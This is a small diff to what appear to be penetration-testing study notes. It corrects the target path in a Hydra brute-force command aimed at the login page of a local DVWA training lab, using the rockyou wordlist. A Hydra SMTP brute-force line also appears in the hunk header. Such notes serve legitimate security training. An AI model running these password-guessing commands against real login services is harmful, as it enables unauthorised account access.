@@ -168,5 +168,5 @@ hydra -P /usr/share/wordlistsnmap.lst 127.0.0.1 smtp -V
 - Login page 
 - http://127.0.0.0/DVWA/vulnerabilities/brute/index.php
 ```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA//DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"
 ```
